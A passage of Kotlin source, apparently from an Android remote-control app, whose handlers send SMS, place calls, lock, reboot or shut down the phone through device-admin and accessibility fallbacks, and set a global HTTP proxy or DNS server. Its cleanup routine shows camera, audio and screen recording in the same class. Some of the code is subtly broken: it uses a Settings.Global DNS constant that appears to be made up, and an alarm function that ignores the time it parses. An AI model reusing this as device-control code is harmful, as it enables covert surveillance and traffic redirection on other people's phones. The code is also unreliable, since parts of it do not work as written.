                Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0)
                val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
                intent.putExtra("state", false)
                intent.addFlags(Intent.FLAG_RECEIVER_REGISTERED_ONLY)
                context.sendBroadcast(intent)
                "Airplane mode OFF (requires system app for full functionality)"
            } else {
                @Suppress("DEPRECATION")
                Settings.System.putInt(context.contentResolver, Settings.System.AIRPLANE_MODE_ON, 0)
                "Airplane mode OFF"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Airplane off error", e)
            "Error: ${e.message} - Airplane mode control requires system privileges"
        }
    }

    // ===== AUTO ROTATE =====
    fun setAutoRotate(context: Context, params: Map<String, Any>): String {
        return try {
            val arg = params["arg"]?.toString()?.lowercase() ?: "on"
            val enabled = arg == "on" || arg == "true" || arg == "1"
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                Settings.System.putInt(
                    context.contentResolver, 
                    Settings.System.ACCELEROMETER_ROTATION,
                    if (enabled) 1 else 0
                )
            }
            "Auto rotate ${if (enabled) "ON" else "OFF"}"
        } catch (e: Exception) {
            Log.e(TAG, "Set auto rotate error", e)
            "Error: ${e.message}"
        }
    }

    // ===== OPEN URL =====
    fun openUrl(context: Context, params: Map<String, Any>): String {
        val url = params["arg"]?.toString() ?: ""
        return if (url.isNotBlank()) {
            try {
                var finalUrl = url
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    finalUrl = "https://$url"
                }
                context.startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(finalUrl)).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opened: $finalUrl"
            } catch (e: Exception) {
                Log.e(TAG, "Open URL error", e)
                "Error opening URL: ${e.message}"
            }
        } else "No URL provided"
    }

    // ===== SEND SMS =====
    fun sendSms(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        return if (arg.isNotBlank()) {
            try {
                val parts = arg.split(" ", limit = 2)
                val number = parts.getOrNull(0) ?: ""
                val message = parts.getOrNull(1) ?: ""
                
                if (number.isBlank() || message.isBlank()) {
                    return "Usage: number message"
                }
                
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) 
                    != PackageManager.PERMISSION_GRANTED) {
                    return "SEND_SMS permission not granted"
                }
                
                val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    context.getSystemService(SmsManager::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    SmsManager.getDefault()
                }
                
                smsManager.sendTextMessage(number, null, message, null, null)
                "SMS sent to $number"
            } catch (e: Exception) {
                Log.e(TAG, "Send SMS error", e)
                "Error: ${e.message}"
            }
        } else "Usage: number message"
    }

    // ===== MAKE CALL =====
    fun makeCall(context: Context, params: Map<String, Any>): String {
        val number = params["arg"]?.toString() ?: ""
        return if (number.isNotBlank()) {
            try {
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) 
                    != PackageManager.PERMISSION_GRANTED) {
                    return "CALL_PHONE permission not granted"
                }
                
                context.startActivity(Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number")).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Calling $number..."
            } catch (e: SecurityException) {
                "CALL_PHONE permission denied"
            } catch (e: Exception) {
                Log.e(TAG, "Make call error", e)
                "Error: ${e.message}"
            }
        } else "No number provided"
    }

    // ===== SPEAK TEXT =====
    fun speakText(context: Context, params: Map<String, Any>): String {
        val text = params["arg"]?.toString() ?: ""
        return if (text.isNotBlank()) {
            try {
                val tts = arrayOfNulls<android.speech.tts.TextToSpeech>(1)
                val latch = CountDownLatch(1)
                
                tts[0] = android.speech.tts.TextToSpeech(context) { status ->
                    if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                        tts[0]?.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "tts_${System.currentTimeMillis()}")
                    }
                    latch.countDown()
                }
                
                "Speaking: $text"
            } catch (e: Exception) {
                Log.e(TAG, "Speak text error", e)
                "Error: ${e.message}"
            }
        } else "No text provided"
    }

    // ===== SHOW NOTIFICATION =====
    fun showNotification(context: Context, params: Map<String, Any>): String {
        val title = params["title"]?.toString() ?: params["arg"]?.toString() ?: "Notification"
        val message = params["message"]?.toString() ?: ""
        
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            
            // Create channel for Android O+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "Abu Zahra Control",
                    NotificationManager.IMPORTANCE_HIGH
                )
                nm.createNotificationChannel(channel)
            }
            
            val notification = NotificationCompat.Builder(context, NOTIFICATION_CHANNEL_ID)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()
            
            nm.notify(System.currentTimeMillis().toInt(), notification)
            "Notification shown: $title"
        } catch (e: Exception) {
            Log.e(TAG, "Show notification error", e)
            "Error: ${e.message}"
        }
    }

    // ===== LOCK PHONE =====
    fun lockPhone(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            
            // Try Device Admin first
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
            
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                return "Phone locked"
            }
            
            // Fallback: try accessibility service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val accessibility = MyAccessibilityService.getInstance()
                if (accessibility != null) {
                    accessibility.lockScreen()
                    return "Phone locked via accessibility"
                }
            }
            
            // Wake then lock
            val wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_DIM_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "abuzahra:lock"
            )
            wl.acquire(100)
            wl.release()
            
            "Phone lock requires Device Admin or Accessibility service"
        } catch (e: Exception) {
            Log.e(TAG, "Lock phone error", e)
            "Error: ${e.message} - Device Admin may not be active"
        }
    }

    // ===== REBOOT =====
    fun reboot(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            
            // Try Device Admin
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
            
            if (dpm.isAdminActive(adminComponent)) {
                pm.reboot("abuzahra_reboot")
                return "Rebooting..."
            }
            
            "Reboot requires Device Admin permission"
        } catch (e: Exception) {
            Log.e(TAG, "Reboot error", e)
            "Error: ${e.message} - REBOOT permission required"
        }
    }

    // ===== SHUTDOWN =====
    fun shutdown(context: Context): String {
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, "com.abuzahra.manager.service.DeviceAdminReceiver")
            
            if (dpm.isAdminActive(adminComponent)) {
                // Use reflection for shutdown
                val clazz = Class.forName("android.os.PowerManager")
                val method = clazz.getMethod("shutdown", Boolean::class.javaPrimitiveType, String::class.java, Boolean::class.javaPrimitiveType)
                method.invoke(pm, false, "abuzahra", true)
                return "Shutting down..."
            }
            
            "Shutdown requires Device Admin permission"
        } catch (e: Exception) {
            Log.e(TAG, "Shutdown error", e)
            "Error: ${e.message} - SHUTDOWN permission required"
        }
    }

    // ===== PLAY SOUND =====
    fun playSound(context: Context, params: Map<String, Any>): String {
        return try {
            val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            
            val soundUri = when (params["sound"]?.toString()) {
                "alarm" -> Settings.System.DEFAULT_ALARM_ALERT_URI
                "notification" -> Settings.System.DEFAULT_NOTIFICATION_URI
                else -> Settings.System.DEFAULT_RINGTONE_URI
            }
            
            val player = android.media.MediaPlayer.create(context, soundUri)
            player?.setOnCompletionListener { it.release() }
            player?.start()
            "Sound played"
        } catch (e: Exception) {
            Log.e(TAG, "Play sound error", e)
            "Error: ${e.message}"
        }
    }

    // ===== LANGUAGE =====
    fun setLanguage(context: Context, params: Map<String, Any>): String {
        val lang = params["arg"]?.toString() ?: ""
        return if (lang.isNotBlank()) {
            try {
                val locale = Locale(lang)
                Locale.setDefault(locale)
                
                val config = context.resources.configuration
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    config.setLocale(locale)
                } else {
                    @Suppress("DEPRECATION")
                    config.locale = locale
                }
                
                context.resources.updateConfiguration(config, context.resources.displayMetrics)
                "Language changed to $lang (requires app restart)"
            } catch (e: Exception) {
                "Error: ${e.message}"
            }
        } else "No language specified"
    }

    // ===== TIMEZONE =====
    fun setTimezone(context: Context, params: Map<String, Any>): String {
        val tz = params["arg"]?.toString() ?: ""
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.ACTION_DATE_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opening date settings"
            } else {
                val alarm = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                @Suppress("DEPRECATION")
                alarm.setTimeZone(tz)
                "Timezone set to $tz"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Set timezone error", e)
            "Error: ${e.message}"
        }
    }

    // ===== ALARM / TIMER / REMINDER =====
    fun setAlarm(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        return if (arg.isNotBlank()) {
            try {
                val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val time = arg.toLongOrNull() ?: (System.currentTimeMillis() + 60000)
                
                val intent = Intent(Intent.ACTION_ALARM_CLOCK).apply {
                    putExtra(Intent.EXTRA_ALARM_COUNT, 1)
                }
                
                context.startActivity(intent)
                "Alarm set: $arg"
            } catch (e: Exception) {
                Log.e(TAG, "Set alarm error", e)
                "Error: ${e.message}"
            }
        } else "No alarm time provided"
    }

    // ===== NFC =====
    fun nfcOn(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.startActivity(Intent(Settings.Panel.ACTION_NFC).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                "Opening NFC settings"
            } else {
                "NFC control requires WRITE_SETTINGS or system privileges"
            }
        } catch (e: Exception) {
            Log.e(TAG, "NFC on error", e)
            "Error: ${e.message}"
        }
    }
    
    fun nfcOff(context: Context): String = nfcOn(context)

    // ===== DNS CHANGE =====
    fun dnsChange(context: Context, params: Map<String, Any>): String {
        val dns = params["arg"]?.toString() ?: params["dns"]?.toString() ?: ""
        if (dns.isBlank()) return "No DNS server address provided (e.g., 8.8.8.8)"
        return try {
            // Try setting via Settings.Global (requires WRITE_SECURE_SETTINGS for system app)
            Settings.Global.putString(context.contentResolver, Settings.Global.ADGUARD_DNS_SERVER, dns)
            "DNS set to $dns via Settings.Global (may require system app or root for full effect; VPN-based DNS is recommended)"
        } catch (e: SecurityException) {
            "DNS change failed: WRITE_SECURE_SETTINGS permission required. VPN-based DNS override is recommended as an alternative."
        } catch (e: Exception) {
            Log.e(TAG, "DNS change error", e)
            "DNS change requires VPN service implementation for reliable results. Error: ${e.message}"
        }
    }

    // ===== PROXY =====
    fun proxySet(context: Context, params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        if (arg.isBlank()) {
            // Clear proxy if no arg
            return try {
                Settings.Global.putString(context.contentResolver, "global_http_proxy_host", null as String?)
                Settings.Global.putInt(context.contentResolver, "global_http_proxy_port", 0)
                Settings.Global.putString(context.contentResolver, "global_http_proxy_exclusion_list", null as String?)
                "Proxy cleared"
            } catch (e: Exception) {
                "Error clearing proxy: ${e.message}"
            }
        }
        return try {
            val parts = arg.split(":")
            val host = parts.getOrNull(0) ?: ""
            val port = parts.getOrNull(1)?.toIntOrNull() ?: 8080

            Settings.Global.putString(context.contentResolver, "global_http_proxy_host", host)
            Settings.Global.putInt(context.contentResolver, "global_http_proxy_port", port)
            Log.d(TAG, "Proxy set to $host:$port via Settings.Global")
            "Proxy set to $host:$port via Settings.Global (requires WRITE_SECURE_SETTINGS for system-wide effect)"
        } catch (e: SecurityException) {
            "Proxy set failed: WRITE_SECURE_SETTINGS required. System app or root needed for global proxy. Error: ${e.message}"
        } catch (e: Exception) {
            Log.e(TAG, "Proxy set error", e)
            "Error: ${e.message}"
        }
    }
    
    // ===== CLEANUP =====
    fun cleanup() {
        try {
            cameraDevice?.close()
            cameraSession?.close()
            imageReader?.close()
            cameraThread?.quitSafely()
            
            if (isRecordingAudio) {
                mediaRecorder?.stop()
                mediaRecorder?.release()
            }
            
            if (isRecordingScreen) {
                screenRecorder?.stop()
                screenRecorder?.release()
                virtualDisplay?.release()
                mediaProjection?.stop()
            }
            
            screenImageReader?.close()
        } catch (_: Exception) {}
        
        cameraDevice = null
        cameraSession = null
        imageReader = null
        cameraThread = null
        mediaRecorder = null
        screenRecorder = null
        virtualDisplay = null
        mediaProjection = null
        screenImageReader = null
        isRecordingAudio = false
        isRecordingScreen = false
    }
}
